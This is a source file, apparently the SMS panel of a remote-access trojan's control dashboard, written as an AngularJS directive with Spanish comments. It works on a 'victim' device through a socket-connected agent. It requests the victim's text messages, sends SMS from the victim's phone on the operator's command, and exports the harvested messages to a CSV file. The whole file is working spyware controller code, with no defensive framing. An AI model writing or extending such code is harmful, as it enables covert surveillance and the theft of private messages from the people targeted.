angular.module('myappy').directive('labSms', function() {
  return {
    restrict: 'E',
    scope: {
      victim: '='
    },
    templateUrl: 'views/smsManager.html',
    controller: function($scope, $rootScope) {
      console.log('[labSms] Controller loaded', $scope.victim);

      $scope.smsList = [];
      $scope.smsSize = 0;
      $scope.barLimit = 100;
      $scope.load = ''; // Para los tabs

      // Pedir lista de SMS al servidor
      $scope.getSMSList = function() {
        if ($scope.victim && $scope.victim.id) {
          console.log('[labSms] getSMSList emit', $scope.victim.id);
          $rootScope.socket.emit('get-sms', { victimId: $scope.victim.id });
        } else {
          console.warn('[labSms] getSMSList: victim or id missing', $scope.victim);
        }
      };

      // Recibir la lista cuando llega desde el backend/agente
      $rootScope.socket.on('sms-data', function(smsJson) {
        console.log('[labSms] sms-data recibido', smsJson);
        try {
          let smsObj;
          if (typeof smsJson === 'string') {
            smsObj = JSON.parse(smsJson);
          } else if (Array.isArray(smsJson)) {
            smsObj = { smsList: smsJson };
          } else {
            smsObj = smsJson;
          }
          console.log('[labSms] smsObj procesado:', smsObj);
          $scope.smsList = smsObj.smsList || [];
          $scope.smsSize = $scope.smsList.length;
          $scope.$apply();
          console.log('[labSms] smsList actualizado:', $scope.smsList);
        } catch (e) {
          console.error('Error parsing sms-data:', e, smsJson);
        }
      });

      // Enviar SMS desde la UI
      $scope.SendSMS = function(phoneNo, msg) {
        console.log('[labSms] SendSMS', phoneNo, msg);
        if (!phoneNo || !msg) {
          alert('Debes ingresar número y mensaje');
          return;
        }
        $rootScope.socket.emit('send-sms', {
          victimId: $scope.victim.id,
          phoneNo: phoneNo,
          msg: msg
        });
      };

      // Recibir resultado del envío
      $rootScope.socket.on('send-sms-result', function(resp) {
        console.log('[labSms] send-sms-result', resp);
        if (resp.ok) {
          alert('SMS enviado!');
        } else {
          alert('Error enviando SMS.');
        }
      });

      // Guardar SMS en CSV
      $scope.SaveSMS = function() {
        console.log('[labSms] SaveSMS', $scope.smsList);
        const csv = $scope.smsList.map(sms => `"${sms.phoneNo}","${sms.msg}"`).join('\n');
        const blob = new Blob([csv], {type: 'text/csv'});
        const link = document.createElement('a');
        link.href = URL.createObjectURL(blob);
        link.download = 'sms_list.csv';
        link.click();
      };

      // Scroll infinito
      $scope.increaseLimit = function() {
        $scope.barLimit += 50;
        console.log('[labSms] increaseLimit', $scope.barLimit);
      };

      // Inicializa la lista al cargar
      $scope.getSMSList();
    }
  };
});